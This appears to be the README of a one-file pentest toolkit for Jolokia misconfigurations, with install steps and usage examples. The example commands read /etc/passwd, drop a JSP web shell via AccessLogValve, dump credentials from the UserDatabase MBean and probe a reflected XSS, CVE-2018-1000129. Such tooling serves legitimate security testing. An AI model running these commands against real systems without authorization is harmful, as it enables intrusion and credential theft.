# Milky

<img align="center" src="./img/milky.png">

Milky is a lightweight, one‑file toolkit that helps pentesters quickly verify
and exploit common Jolokia misconfigurations / weaknesses (File‑read,
AccessLogValve RCE, UserDatabase dump, Spring `EnvironmentManager` abuse,
reflected XSS CVE‑2018‑1000129).


## Installation

```bash
git clone https://github.com/unclej4ck/milky.git
cd milky
python3 -m venv venv && . venv/bin/activate
pip install -r requirements.txt
```

## Quick examples

### Verification of Jolokia misconfiguration
```
python3 milky.py http://target:8080/jolokia scan
```
### Read /etc/passwd through DiagnosticCommand
```
python3 milky.py http://target:8080/jolokia read -f /etc/passwd
```

### Drop & verify a JSP shell via AccessLogValve
```
python3 milky.py http://target:8080/jolokia deploy
```

### Dump credentials from the UserDatabase MBean
```
python3 milky.py http://target:8080/jolokia creds
```
### Reflected‑XSS probe (CVE‑2018‑1000129)
```
python3 milky.py http://target:8080/jolokia xss
```

> Add --debug for full HTTP traces and --user/--password for Basic‑Auth.


## TO-DO
- [ ] Adding more exploits
- [ ] Adding more verifications
- [ ] Fixing bugs

## Credits

Thanks to laluka for his work on [jolokia-exploit](https://github.com/laluka/jolokia-exploitation-toolkit).
